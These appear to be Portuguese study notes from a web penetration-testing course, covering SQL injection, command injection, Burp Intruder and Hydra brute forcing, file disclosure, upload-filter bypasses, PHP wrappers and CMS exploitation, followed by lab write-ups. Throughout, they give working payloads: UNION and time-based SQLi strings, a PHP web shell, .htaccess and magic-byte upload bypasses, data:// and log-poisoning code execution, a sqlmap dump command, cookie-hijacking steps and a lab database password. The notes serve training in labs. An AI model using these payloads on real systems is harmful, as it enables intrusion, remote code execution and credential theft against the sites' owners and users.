    EX: `<ip>/<página>/<sub-pagina>.php?id=-1 union select 1, table_name,3,4,5 from information_schema.tables where table_schema=char(100,98,109,114,116,117,114)`
    
    char(100,98,109,114,116,117,114) = “desec”






-----------------













# Blind SQL Injection

Um tipo totalmente único de SQL Injection que merece uma sessão separada é o que chamamos de Blind SQL Injection.

Basicamente essa vulnerabilidade tem a característica em especial de não demonstrar a mensagem de erro no retorno, complicando assim bastante as verificações do banco de dados alvo

Mas então como explorar se não temos o erro sendo retornado?

- Crie uma condição verdadeira e coloque ela na box esperando obter um retorno seja ele qual for
    
    EX: `‘ or 2=2#`
    
- Caso ele retorne alguma informação referente a tentativa feita identificamos que essa box de inserção de dados é vulnerável a Blind SQL Injection…
    
- Para seguir explorando utilize a box com a condição verdadeira para realizar as verificações já vistas nos outros SQL Injections, quando a box retornar algo quer dizer que algo foi encontrado!
    
    EX: `‘ or 2=2# union select 1,2#` : Tentando encontrar o número de itens no banco de dados…
    

### Informações importantes para BlindSQL

**Comandos MySQL:**

- `select length(database())` : Retorna tamanho da database
- `select substring(”mysql”,2,1)` : Retorna segundo caractere da string
- `select substring(”mysql”,1,5)` : Retorna os 5 primeiros caracteres da string
- `select substring(database()2,1)` : Retorna segunda letra do nome da database

—> Importante pois no Blind SQL precisamos ficar adivinhando itens, sendo assim usaremos esses comandos…

### Explorando um caso mais realista

Utilizando o BURP exploraremos um caso mais realista que podemos encontrar no dia a dia relacionado a Blind SQL Injection…

1. Com o BURP enviaremos um POST para a box com `‘` —> teste de erro e `‘ or 2=2#` —> Teste de BlindSQL
2. Compare os erros para fazer a validação entre `retorno falso x retorno verdadeiro` da aplicação
3. Crie o padrão de acordo com os retornos para entender a lógica
4. Verifica o tamanho da tabela utilizando o length
    - `' and (select length(group_concat(table_name)) = 1 from information_schema.table where table.schema=”<tabela>”#` : Verifica se o tamanho da tabela é 1, vai aumentando esse número até receber o mesmo retorno de 1=1 e confirma o tamanho da tabela
5. Realize a mesma lógica após encontrar os caracteres do nome da tabela usando o comando substring()
6. Aplique mesma lógica de substring() para descobrir nome de colunas
7. Siga aplicando isso para ir mudando os itens e descobrindo itens do banco de dados

_—>`Por mais que esse caso seja complexo, o mais importante para o Blind SQLi é —> IDENTIFICAR A VULNERABILIDADE` ←_



### Time Based SQL Injection

Para completar essa sessão devemos colocar também uma forma de explorar o Blind SQL Injection que é uma das mais usadas nesse caso, que é a Time Based SQL Injection.

Nesse caso utilizamos a função `sleep()` para criar um padrão de retorno verdadeiro e assim descobrirmos as informações sobre o o alvo.

**Código a ser passado**: `‘ or sleep(<tempo>)#` —> Caso funcione no tempo passado quer dizer que é vulnerável

**Exploração**: A partir da verificação de que a aplicação é vulnerável podemos criar condições para a execução do sleep que nos confirmarão informações sobre o banco de dados, exemplo:

`‘ or if(length(database())=2,sleep(3),0)#` : Se o tamanho da database for 2 ele demora 3 segundos para dar um retorno depois do POST!!!







------------










# Bypass Client Side

Como outro item que deve ser considerado sempre que estivermos procurando por vulns em websites precisamos citar o Bypass Client Side.

Muitas vezes em páginas desativadas podemos ter recursos mal configurados ou lixo deixados por devs. Por isso sempre vale a pena revisar o que veremos a seguir…

`Alvo`: Páginas não mais utilizadas, desativadas, ou até mesmo páginas normais…

`Forma de verificação`:

- Abra o código fonte da página (html) e revise o código de forma **completa!**
- Foque em itens postos que possam ser manipulados para envio de dados, exemplo:
    - Boxes com comando disable ativado
    - Boxes com max-length definido
- Remova os itens postos no código fonte na mão mesmo, e dessa forma poderemos manipular a página para deixa-la mais explorável
- Utilize essas modificações e aplique as verificações normais para encontrar novas vulnerabilidades





-----





# Command Injection

Em algumas páginas podemos nos deparar com itens como boxes, ou artigos que permitem inserção de dados que realizam chamadas de comando bash no Web Server.

Com isso podemos explorar esses itens realizando chamadas de linhas de comando de acordo com a necessidade, sendo assim observe um caso de uso abaixo:

`Alvo`: Itens que realizem comandos direto no bash ou com a função system() no servidor

`Passo a passo para manipulação`:

- Realize verificações no código fonte da página para entender o item que exploraremos da página
- Realize testes no item que recebe dados com `;<comando>` ou `|<comando>` para verificar vulnerabilidade
- Utilizando o BURP envie os dados ao item e observe o retorno do WebServer visando **identificar padrões**
- Realize testes no seu terminal visando receber o mesmo retorno que o Web Server retorna ao BURP, e dessa maneira entender como é feita a chamada desse comando no server
- Adapte o comando para que ele seja aplicável a maneira de funcionamento do item no Web Server
- Explore o item!

### Automatizando a exploração de CMDi

Para realizarmos a exploração observada acima de forma automatizada podemos usar a aplicação `commix`

`commix` : Ferramenta que gera payload de command injection e envia via POST ou GET para a aplicação

`Utilização` :

- Com o BURP realize um envio de dados teste e identifique o nome da `variável` responsável por enviar dados na página
    
    ![Na requisição teste com “asda” foi possível observar que a variável que recebe a data é site](attachment:d47d3bd0-a05d-48a1-bb49-cf1e86fd6b5e:image.png)
    
    Na requisição teste com “asda” foi possível observar que a variável que recebe a data é site
    
- Com essa informação podemos construir o comando necessário para exploração
    
- `commix —url <URLcompleta> —data=”<variavel>=<url qualquer>”`
    
- Dessa forma o comando será capaz de explorar a página com payloads complexos pré-definidos
    






------





# Burp Suite like a pro…

Nessa sessão exploraremos algumas funcionalidades do Burp Suite que permitem muitas possibilidades na exploração e Pentest…

### Enumerando campos com Intruder

Com essa técnica podemos realizar um bruteforce em cima de um campo que está sendo enviado pelo Burp, e usando uma wordlist entendemos os retornos que são feitos pela aplicação e forçamos esse descobrimento

`Caso de uso` :

1. Abra o Burp Suite e envie uma mensagem de teste para aparecer o POST na sua tela do BURP - Utilize o Proxy para interceptar as mensagens
2. Ache o POST no Burp, selecione ele com o botão direito e logo depois clique em > `Send to Intruder`
3. Nessa nova aba temos algumas funcionalidades, inicie selecionando o tipo do ataque como Sniper Attack (mais pra frente exploraremos outros tipos
4. Como próximo passo selecione o item que será alterado por vários da Wordlist e clique na opção `ADD` para marca-lo
5. Em `Payload Configuration > Load` carregue a wordlist a sua escolha para ser substituída pelo campo que marcamos com Add
6. Selecione _Start Attack_

- Iniciado a ataque todos os itens da wordlist irão gerar uma requisição, e essa requisição apareça na tela
    
    ![[Pasted image 20251119225248.png]]
    
    Para entendermos se o retorno de uma requisição específica foi positivo ou diferente podemos usar dois métodos
    
    1. Observar tamanho dos pacotes —> Pacotes com retorno positivo costumam ser maiores
        
    2. Marcar em `Options > Grep` um item que é apresentado quando o payload vem bem sucedido. dessa forma quando ele vier em algum pacote uma box vai ficar marcada para discernimento
        
        ![[Pasted image 20251119225256.png]]
        
    
    *Fuzzing de vulnerabilidades com Burp*
    
    Da mesma forma seguindo essa lógica podemos usar o Burp para realizar um grande Fuzzing de vulnerabilidades na pagina afim de agilizar o tempo de procura…
    
    Para isso segue o passo a passo:
    
    1. Realize o entendimento do campo a ser explorado, como a requisição e o envio de dados são feitos e os retornos da aplicação (verdadeiro e falso)
    2. Com o Burp mande um envio teste e realize a captura tele no Proxy
    3. Altere os campos interessantes (Login ou Senha por exemplo) e utilize `Add e Payload Configuration`
    4. Carregue uma wordlist boa, exemplo —> `/usr/share/seclists/fuzzing/<escolhe1>`
        1. Selecione o `GREP` com um item que ocorre apenas em retornos negativos (Login incorreto por exemplo)
    5. **Start Attack**
    6. Entenda as requisições feitas, até as incorretas, para entender como a aplicação funciona
    7. Os itens que tiverem a box marcada e o retorno do pacote for `300,301,302` ou o `tamanhos forem diferentes` funcionaram… Explore eles inserindo dados na aplicação agora…
    
    - Um caso de uso pode ser em boxes que exploraremos com listas de **SQLi** no mesmo path já passado acima, podem trazer frutos muito positivos…
    - O entendimento do retorno com erro é essencial para definir o `GREP`
    
    `Caso de uso 2`:
    
    Como caso de uso também podemos usar a mesma lógica para verificação de arquivos locais (LFI) realizando a manipulação da URL com wordlist….
    
    1. Entenda bem a URL selecionada
    2. Ache o parâmetro a ser alterado, ex: `<url>/página.php?p=<parametro>`
    3. Ponha o Add no parâmetro
    4. Use uma lista específica para isso, exemplo `usr/share/seclists/fuzzing/<escolhe1 do LFI>`
    5. Configura corretamente o `GREP`
    
    ### Personalizando Regras no Intruder
    
    Seguindo a mesma lógica que já revisamos é possível utilizar regras de personalização do Intruder para deixar ainda mais dinâmica a forma como usaremos as listas, abaixo especifico algumas dessas formas:
    
    - `Custom Interator`: Permite mesclar informações de duas listas diferentes utilizando um divisor entre elas
        
        ![[Pasted image 20251119225333.png]]
        
        → Selecione os itens a serem dinamicamente alterados com Add, Selecione a posição referente wordlist que escolheremos, carregue a Wordlist, selecione o separador para o próximo item, selecione o item logo a seguir em position para configurar a próxima Wordlist…. ←
        
    
    ### Realizando ataques com Burp Suite
    
    Nessa sessão em específico entenderemos com realizar ataques mais agressivos via plataforma do Burp Suite, seguindo as mesmas lógicas com o `Intruder`
    
    - **`Tipos de Intruder`**:
        
        - `Pitchfork` : 2 listas para 2 variáveis, aplica 1-1, 2-2 e vai realizando dessa forma
        - `Clustering Bomb` : 2 listas, cruza todos os itens com todos os itens
        - `Battering Bomb` : Apenas 1 lista, testa mesma lista em todas as variáveis postas no POST
        - `Sniper Attack` : 1 lista, testa variáveis 1 de cada vez, 1 por vez
        
        Agora que entendemos os tipos possíveis de ataque, é possível como fazer uma exploração de Bruteforce em uma box de login e senha usando `Clustering Bomb`
        
        _Lembre-se de configurar um bom grep_
        
    
    **Hydra para bruteforce**
    
    Também é possível realizar o mesmo processo com Hydra, com um comando específico
    
    `hydra -v -L <users.txt> -P <passwords.txt> <ip> http-post-form “<página>/<subpágina>.php:login=^USER^&senha=^PASS^&Login:<palavra chave de quando ocorre erro>`
    
    *Login —> Podia não ser Login, vai ser o nome do botão no código fonte
    
    *Pode ser GET ao invés de POST
    
    *Palavra chave é um retorno de erro
    





-----







# Problemas com autorização

Muitas vezes em uma página que está sendo analisada podemos nos deparar com certos acessos a sub-páginas ou sub-dominios que na verdade não deveriamos ser capazes de acessar…

**Ex**: Usuário não premium acessa a página `<URL>/<pagina>/premium.php` apenas colocando a URL

**Ex2:** Dentro da página tentamos acessar recursos que não deveriam ser acessíveis clicando e conseguimos acessar…

`Exemplo prático` : Nesse caso temos uma página simples em PHP que solicita login e senha, dentro do banco de dados temos 2 users (premium e standart) e quando cada um deles coloca suas credenciais é redirecionado para uma página especifica.

`Vulnerabilidade da página`: Caso um dos users ponha a URL do outro ele é capaz de acessar a página do outro diretamente

Descobrindo a vulnerabilidade:

- Realize uma pesquisa por páginas com `GoBuster`
- Realize uma busca por páginas com `Burp Suite` ; Realize mudança na URL e force a entrada na outra página
- Se tivermos uma credencial válida use o `cookie` da sessão e refaça os testes do `GoBuster` especificando o cookie para encontrar ainda mais itens…

### Exemplo: Cookies e Sessões (LAB)

- Nesse caso temos os mesmos dois users enfrentando uma página de login para serem lançados as suas páginas referentes, observe o passo a passo para burlar a aplicação

1. Entendendo a aplicação observamos que ela use cookies para bloquear os redirecionamentos diretos e dessa vez não conseguimos acessar diretamente…
    
2. Para iniciar caso tenhamos roubado um cookie já, podemos usa-lo seguindo o seguinte processo no navegador: `Ferramentas do desenvolvedor > Storege > document.cookie > Coloca cookie`
    
3. A seguir com o mesmo cookie sempre lembre de usa-lo também com o Gobuster para verificar se não achamos algo a+
    
    `-c <cookie>`
    
4. Outra forma de explorar é realizar um `curl` direto para a página secreta, muitas vezes fazer isso pode mostrar o código fonte de página, e assim é só recria-la fora…
    
5. Caso nada acima de certo, realize a criação de uma página fake e com as outras explorações que vimos em outras sessões altere o código da página fake para que o cookie da sessão de quem acessar seja armazenado pra você —> `Sequestro de Cookie`
    
6. Com esse cookie refaça os testes e faça as explorações necessárias
    




------







# File Disclosure

A vulnerabilidade de file disclosure basicamente se resume a uma verificação que veremos a seguir, que pode ser feita com o Burp Suite

`Alvo`: Campos de Download

`Verificação da Vuln` :

- Simule o download da vulnerabilidade e capture no proxy com o Burp
    
- Observe os campos e veja se não existe algo que demonstre alguma negativa para o download, como um `false` ou `not true` —> Valores podem estar em `Base64`
    
- Caso eles existam altere esse valor para `True`
    
    ![[Pasted image 20251119225420.png]]
    
- Feito isso podemos **alterar** agora o arquivo de download mudando o path no GET, tendo em vista que ele faz o Download diretamente…
    
    ![[Pasted image 20251119225423.png]]
    
- Com isso podemos realizar qualquer download de qualquer arquivo do WebServer (`/etc/passwd` e por ai vai… (Baixe o próprio arquivo sempre para entender e o index da página!)
    





-----







# Explorando Inputs e Uploads (Tem upload? Verifica!)

Em páginas que permitem realizar uploads podemos passar um exploit PHP em código via POST, para executar comandos no server…

```php
<?php system($_POST['hack']); ?>
```

- Ao enviar o POST com `curl` podemos aplicar comandos para executa-los
    
    EX: `curl -v <URL>/<pagina>.php -d “hack=<comando>”`
    

Com essa premissa podemos partir para as explorações de Upload a seguir…

### Bypass Upload Extensões

Ao realizarmos o upload do arquivo PHP podemos nos deparar primeiramente com alguns problemas, entre eles:

- **Como achar o programa após realizar o upload para abrir ele via URL e executa-lo?**
    - Verifique o código fonte!
- **O que fazer caso o item de upload recuse o arquivo .php?**
    - Realize o envio do arquivo com uma extensão mascarada semelhante, `.phP` ou `.PhP` por exemplo
- O que fazer caso POST fique ruim para exploração?
    - Utilize a função GET alterando aṕenas o parâmetro no código e fazendo a inserção de comandos via URL com `?hack=<comando>`

### Bypass Upload: .htaccess

Outra forma que podemos dar bypass em web páginas usando campos de upload é realizando o upload de um arquivo `.htaccess`

`.htacess` : Muitas vezes em páginas PHP é possível termos a opção de `htaccess-allow-overide` que quando está on é possível subir um arquivo de configurações para controle remoto da página PHP do apache

`Exploração`:

1. Crie um arquivo `.htaccess` local na sua máquina e manipule para que ele faça o que você quer..
    
    EX: `AddType application/x-httpd-php .sec` : Comando que transforma extensões .sec em .php, para burlarmos a restrição do site
    
2. Realize upload do .htaccess na página
    
3. Realize o upload do php de exploração com a extensão .sec
    
4. Explore o alvo!
    

### Bypass Upload: Verificador de conteúdo

O que fazer caso mesmo realizando todos esses processos o servidor seguir recusando o upload do payload malicioso?

**Muitas vezes podemos nos deparar com web páginas que tem verificadores de tipos de arquivos, esses abrem o arquivo e usam padrões para encontrar seu tipo**

`Exe`: No caso do PHP os leitores de tipo abrem o arquivo e procuram pelo header clássico do PHP, como `%PDF-1.5` para entender se é ou não é PDF

`Como burlar verificadores de arquivos?`

1. Realize os testes de upload na aplicação
    
2. Entenda quais tipos a aplicação aceita
    
3. Abra um arquivo que é aceito e entenda o que faz ele ser aceito
    
4. Adicione esse item no payload malicioso do PHP
    
5. Realize o upload do payload e explore o alvo
    
    Exe: No arquivo paylod adicionamos na primeira linha `%PDF-1.5` e uma extensão adicional `.pdf` no final —> `arquivo.php.pdf`
    
    → Com falha de LFI tiramos o .pdf usando o Null Byte na URL ←
    
    `page=<pathdoarquivo>%00&hack=<comando>`
    

### Bypass Upload: Imagens

Nessa sessão usaremos um caso de uso de upload de imagens para explorar o Mindset Hacker

`Situação:` Em um campo de upload é solicitado uma imagem, mas mesmo realizando todos os processos feitos até agora todos os arquivos são recusados…

- Identificamos que a imagem usa **ImageMagick**

`Passo a passo para exploração` :

1. Procure na internet por exploits relacionados ao ImageMagick —> Achamos o ImageTragick
2. Entende e estuda o exploit
3. Cria o exploit localmente
4. Testa o envio do exploit a aplicação e se necessário altera a extensão dele

- A seguir entendemos que o caso que permite um Blind Injection, então usaremos `sleep()`
- Confirmado que a página processa o dado enviado com `sleep()` suba a estrutura localmente para testes, construa um comando `wget` para controle remoto da shell passando a um agente remoto, e o arquivo ao servidor dando acesso a VC!

### Bypass Upload: BURP Suite

Importante ressaltar também que alguns verificadores de arquivos na internet podem ser bypassados facilmente apenas alterando alguns itens no BURP. Um desses itens é o Content Type:

![[Pasted image 20251119225649.png]]

Na imagem acima ressalto o item citado, caso alteremos para `application/pdf` muito possivelmente o site entenderá como um PDF e podermos realizar o bypass.

Observe abaixo um exemplo de caso de uso do PEv2:

```bash
1. Criação de arquivo clássico de exploração PHP com Post

2. Ligar BURP

3. Tentar realizar o envio do arquivo PHP

4. Ao enviar o arquivo pra página WEB altera o Content Type de application/x-php pra application/pdf ***

5. Analisei o código fonte pra ver de onde vinha o download da página caso eu quisses baixar o arquivo que fiz upload

6. Abri esse path na URL após verificar no código fonte qual era ele
<http://homologacao.decstore.dsc:8080/contratos/trm4420120901124928.php>
**O download era algo como download.php?file=/contratos/trm4420120901124928.php

7. Ao abrir a página eu sabia que ele estava lá e estava sendo executado

8. Tentei mandar comando com POST no meu host 
curl "<http://homologacao.decstore.dsc:8080/contratos/trm4420120901124928.php>" \\ -d "hack=id"

9. Vi que funcionava e isso me dava acesso ao Host!!!
```





-----------







# PHP Wrappers, Joomla e PHPMailer

### PHP Wrappers

Muitas vezes em novos PHPs podemos nos deparar com certa dificuldade em explorar vulnerabilidades como a LFI pois o `null byte` não funciona. Em casos que precisamos de certa manipulação entram os `wrappers`

`Wrappers` : Funções prefixos do PHP que permitem especificar exatamente o que queremos na URL

Exemplos:

- `file://` : Especifica arquivo —> `file://<arquivo>`
- `data://` : `data://text/plan,<valor em string>`
    - escreve data na página
    - `data://text/plan,base64,<valor em base64>` : Passa em base64
    - EX: `http://rh.businesscorp.com.br/?page=data://text/plain,<?php system("id"); ?>`
    - Talvez valha a pena encodar o código em base64….
    - Você pode passar até comandos PHP e ver o retorno deles no código fonte
- `http://` : Obvio

**—> Com o data:// caso você queria mandar exploit com o payload de exploração via GET, você usa `&desec=<comando>` e não `?desec=<comando>`**

→ Use o comando `data://` para enviar dados normais ou em base64 e ver seu retorno no código fonte, assim exploraremos e identificamos itens da página… ←



### Explorando Joomla

**Joomla** : **Joomla** é um **CMS (Content Management System)**, parecido com WordPress e Drupal, usado para criar e gerenciar sites sem precisar programar tudo do zero

Essa aplicação é muito usadas em sites pelo mundo, basta verificar o código fonte das páginas para encontrar muitos Joomlas por aí…

E, como é `open source`, temos acesso a todo o tipo de informações importantes pesquisando pelo Joomla no github. Informações como `diretórios base importantes e arquivos de configuração`;

No Kali temos uma aplicação chamada de joomscan que permite realizar uma verificação por vulnerabilidades de forma personalizada..

`joomscan -u <site>` : Encontra vulnerabilidades na página

→ Também vale a pena pesquisar por vulns no `Metasploit` ou `Exploit-db`

*Exploit usado para MySQL injection: [https://www.exploit-db.com/exploits/42033](https://www.exploit-db.com/exploits/42033) EX: `sqlmap -u "[<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml>](<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml>)" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]`

- Percebe como -D é database, -C colunas e -T tabela
- Pra eu descobrindo vai pedindo um a um, -D —tables, -T —columns e assim vai

### PHPMailer

`PHPMailer` : Aplicação que permite você mandar um e-mail diretamente pela página WEB que você está acessando, muito usado!!!

`Exploração` :

1. Inicie com o Information Gathering padrão para identificar o PHPMailer e sua versão
2. Encontre um exploit para PHPMailer no Metasploit ou Exploit-DB
3. Adapte esse exploit para tudo o que for necessário para a exploração (nome de campos, código fonte, IPs de retorno, TUDO!!)
4. Caso você coloque como payload um comando no servidor, ele criará também uma página e você observa o retorno nela…




-----------











# Construindo Mindset Hacker

Nessa sessão usaremos a aplicação **Wordpress** encontrada em um pestest para recriar uma situação onde precisamos explorar algo que nunca tinhamos visto anteriormente!

### Passo a passo para explorar aplicação não vista antes…

1. Download da aplicação(nesse caso Wordpress) e estudo da estrutura de pastas, arquivos e configurações possíveis…
2. Suba o MySQL e Apache para reproduzir com fidelidade o Wordpress com o login de usuário nele
3. Realize configurações básicas no WP (arquivo - wp-config.php)
4. `<IP do host>/wordpress` aba de instalação e acesso
5. Acesso o MySQL e entenda a estrutura de database para o Wordpress
6. Faça o teste de plugins e temas no Wordpress (Principais fontes de exploração)

### Exploração do Wordpress

1. De frente com o Wordpress faça o reconhecimento de páginas e sub páginas no domínio alvo
    
2. `readme.html` —> Página encontrada que mostra versão do Wordpress
    
3. `wpscan` : Ferramenta para exploração de Wordpress
    
    `wpscan —url <url do WP>` : Vale a pena pegar o Token da versão gratis no site
    
    `wpscan —url <url do WP> --apitokwn <token>`
    
    `wpscan —url <url do WP> --apitokwn <token> --enumerate <p/t> --plugins-detection agressive` : Tenta explorar plugins ou temas
    
4. Ache exploits nas databases padrões e faça alterações necessárias para explorar a aplicação
    
5. Explorando o Wordpress acesse os itens que podem ter conexão com o MySQL baseado nos itens que vimos no lab —> explore o sistema
    
6. Senhas devem estar em hash!
    

### Obtendo RCE via Wordpress





----






# OWASP, Livros e LABs

**OWASP**: Iniciativa global que organiza e reune todas as vulnerabilidades conhecidas de páginas WEB —> `owasp.org`

- Tem rank de vulns + exploradas
- Tem explicação e exemplos de cada vulnerabilidade…
- OWASP tem direto eventos e workshops
- Verificar TOP 10 OWASP —> Referência total

### Livros e Labs

Sistemas de treinamento:

- DVWA
- BWAPP
- Pentest LAB Free Exercises

Livros:

- The Web Application Hacker Handbook
- Real World Bug Hunting
- Pentest Aplicações WEB (português)





----







# Exploração rápida de página (Checklist)





-----





# LABS

Na sessão abaixo tenho documentado todo o processo de LABs feitos para o módulo de WEB, essa sessão pode ser de grande valia em diversos casos do dia a dia!

LAB 1 - WEB

- Abro a URL e me deparo com uma página de login simples, já indicando que poderíamos explorar isso de alguma forma
- Faço o teste de login com ‘ para forçar o erro
- Como o erro retorna erro de SQL fiz o resultado True básico `‘ or 2=2#`

DONE!

---

LAB 2 - WEB

- Beleza nesse novo LAB não sei nada desse domínio então começo enumerando com DIRB (Faz sentido enumerar subdominio tmb mas n fiz)
    
- Achei o [http://37.59.174.239/login/](http://37.59.174.239/login/) onde se põe o email e recebe o voucher
    
- Como a página não me dizia nada comecei analisando o código fonte e achei
    
    - Campo com hidden chamado cupom (campo desativado)
    - Campo que solicitava apenas e-mails logo acima
- Depois de bater muita cabeça com o BURP tentando explorar várias wordlists nessas boxes nada rolou
    
- Li as dicas e vi que 0=OFF e 1=ON
    
- Só por lógica pus meu email no campo certo de email e 1 no campo desativado
    

DONE!

---

LAB 3 - WEB

- Iniciando a exploração vi que abrindo a página não tinha NADA! Com isso os primeiros passos são sempre → `RECON de subdominios, subpáginas e código fonte`
    
- Encontrando subpáginas achei a /system com uma box que basicamente testa ping
    
- Dando uma testada boa na box vi que basicamente o retorno dela é o mesmo do comando ping no Linux, o que poderia ser um caso de uma chamada system no PHP e o retorno direto dela na tela!!
    
- Testando mais no meu terminal vi que estava certo tanto pelo caso em que o ping funciona quando o retorno de erro
    
- Fiz várias manipulações com GREP e -c até chegar exatamente no que seria o comando usado no server
    
- BLZ → Como identifiquei a vuln agora basta abrir o BURP e testar o envio na box automatizado pra casos como esse com a wordlist [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)
    
- Eventualmente fazendo os filtros certos no BURP vi que alguns tinham retorno diferente do erro do ping e com isso o comando funcionava na manipulação feita pela wordlist. O que usei foi `;<comando>;` para explorar
    
    DONE!
    
    ---
    

CMS - 1

- Mais um LAB que abro e não tem nada, sendo assim gobuster pra identificar páginas e subdomínios !
    
    - `gobuster dns -d [grupobusinesscorp.com](<http://grupobusinesscorp.com/>) -w <wordlist do dirb> -t 30` : Acha subdomains
    - `dirb [http://](<http://172.30.0.128/>)grupobusinesscorp.com /usr/share/wordlists/dirb/big.txt`
- Com isso achei o subdomain [blog.grupobusinesscorp.com](http://blog.grupobusinesscorp.com) e a página /blog/ dele!!
    
- —> /readme.html tem a versão do Wordpress
    
- Abrindo essa página da pra ver que é um Wordpress e sei que tem uma aplicação boa para achar vulns pra ele [wpvulndb.com](http://wpvulndb.com/)
    
    - `wpscan --url [blog.grupobusinesscorp.com/blog](<http://blog.grupobusinesscorp.com/blog>) --enumerate vp --plugins-detection agressive`
- E também em adicional pesquisei por vulns na internet (exploitdb) justamente para encontrar items que versem com as vulns que achei do wpscan
    
- Achei um SQLi para essa versão do Wordpress e adaptei ela da seguinte forma, pois tinha uma página diferente:
    
    - [http://www.site.com/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1](http://www.site.com/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1) UNION ALL SELECT @@version,2,3
- BLZ agora que verifiquei que consigo explorar com esse SQLi preciso seguir o processo normal já visto nesse módulo para pegar user e sua senha
    
    - [http://37.59.174.231/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1](http://37.59.174.231/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1) UNION ALL SELECT database(),2,3 : Pega Database
    - [](http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1%20UNION%20ALL%20SELECT%20user_login,2,3%20from%20wp_users)[http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1](http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1) UNION ALL SELECT user_login,2,3 from wp_users : Pega usuário da database padrão do WP
    - [](http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1%20UNION%20ALL%20SELECT%20user_login,2,3%20from%20wp_users)[http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1](http://blog.grupobusinesscorp.com/blog/wp-content/plugins/wp-forum/sendmail.php?action=quote&id=-1) UNION ALL SELECT user_pass,2,3 from wp_users : Pega senha da database padrão do WP
    
    ---
    

CMS - 2

Agora com acesso ao wordpress podemos tentar a começar a vulns que nos levem ainda mais longe. Tive foco em Themes e Plugins

Acessando a página de themes vi que era possível alterar a página de erro 404, o que pode gerar uma boa vuln pra nós. Nessa página adicionei `system("id");` pra ver se ela retornaria o comando quando eu abrisse

Pesquisando sobre WP vi que a página seria aberta no path: /wp-content/themes/classic/404.php. E bingo ele retornava o retorno do comando.

Alterei para um payload malicioso mais fácil de manipular e achei a chave

---

CMS - 3

Agora como no 2 achamos como dar comandos no server aqui é basicamente exploração de host.

Pesquisando sobre WP vi que geralmente as informações de banco de dados ficam em wp-config.php. Quando tentei abrir ele vi que a página vinha em branco.

O pulo do gato foi que quando eu abria o wp-config.php o certo seria abrir também o código fonte lá estavam as configs e as credenciais.

---

RH - 1

- LAB mais fácil do módulo, bastou explorar um pouco a página e abrir os links
- Na URL de [http://rh.businesscorp.com.br/?page=submit](http://rh.businesscorp.com.br/?page=submit)
- —> page

---

RH - 2

- Seguindo a exploração agora que achamos a LFI tentei primeiramente explorar da forma clássica!!
- Não deu certo então tentei com o BURP com a wordlist padrão pra LFI → Também não deu certo
- A lei de ouro do LFI é: Nada deu certo vamos pro `PHP Wrappers`
- No clássico usamos o data para explorar
    - <[<http://rh.businesscorp.com.br/?page=data://text/plan,<?php>](http://rh.businesscorp.com.br/?page=data://text/plan,%3C?php)> system(id); ?>
- Para ver o resultado abri o código fonte!

---

RH - 3

- Aqui foi basicamente também seguir a exploração do RH 2 mas agora tentando achar o user do mysql
    
- `SEMPRE EXPLORE COM -a`
    
- Abrindo os dirs vi que tinham várias coisas, decidi por testar todas
    
- Com isso vi que no arquivo prog
    
- Dentro tem:
    
    ```
    $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
    $db = mysql_select_db('deseclfi', $lnk);
    ```
    
    DONE!
    

---

LAB - 172.30.0.128

- Comecei analisando com DIRB mas nesse caso depois ainda passei a wordlist big.txt pois não tinha achado nada! → achei /supportdesk/
    
- BLZ → Comecei a explorar dirs dentro dele, a dica dizia que /var/spool/mail/www-data é o diretório onde vão as logs desse postfix que esse server tem!
    
- Com isso simulei o envio de um email pra tentar ver o que chegava no server e na pasta
    
    ```bash
    Mandei um email com netcat na 25 com
    mail from:msb
    220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
    250 2.1.0 Ok
    rcpt to:www-data
    250 2.1.5 Ok
    data
    354 End data with <CR><LF>.<CR><LF>
    <?php system($_GET['momo']); ?>
    
    .
    quit
    ```
    
- Quando abri a página vi que o payload PHP foi carregado então basta manipular a variável na URL!
    
    DONE
    

---

LAB - 172.30.0.130

---

LAB - 172.30.0.125

Inicio do LAB clássico quando não se sabe nada com DIRB, encontrei uma página que envia emails (contact.php e a pasta vendor. Com NMAP também vi que a porta 25 estava aberta e que se tratava de um PHPMailer…

BLZ → Como achei esse cara e também a `versão` dele achei também um exploit bom de PHPMailer na internet e testei, vi que funcionava e prossegui a exploração

No exploit que peguei da internet eu troque o dir de ataque pelo dir /vendor/ do server pois é um dir que estava disponível e achei que seria bom explorar… O objetivo era mandar o arquivo malicioso do exploit pra esse dir vendor

Também precisei alterar o postfields do exploit pra que ele funcione direitinho… Com os parâmetros batendo com os que devem ser pro server.

Dai envia o exploit pro server, abre a pasta vendor você mesmo, e clica em cima do seu exploit que foi enviado pra pasta! Quando vc fizer isso ele vai executar o conteúdo que vc pos como payload PHP do exploit.

Explora com o payload padrão e acha a chave!

---

LAB - 172.16.1.177

Comecei com a enumeração padrão da página com DIRB e código fonte! No código fonte eu acho uma página com um download bem interessante (/download.php?baixar=e_book.pdf) parecendo bastante LFI!

Abri a página e como a dica recomendava um log poisoning no /var/log/auth.log me direciono a isso, como o auth.log abre mesmo com a LFI vejo que esse é o caminho.

Pra funcionar eu precisava passar como user um payload malicioso PHP pra quando eu abrir o auth.log funcionar o log poisoning.

SSH não deixava o payload como user, e daí fui pro SFTP pra conseguir mandar:

`curl -u "<?php system($_GET[desec]); ?>'" sftp://172.16.1.177 -k` Dai explora e acha a chave!

---

LAB - 172.16.1.216

Quando abri a página vi que era um dir com vários arquivos, olhei cada um deles. 1 deles estava ali apenas para envio e recebimento de dados.

Tentei mandar o payload PHP padrão e vi que foi de boa, agora era achar pra ele foi

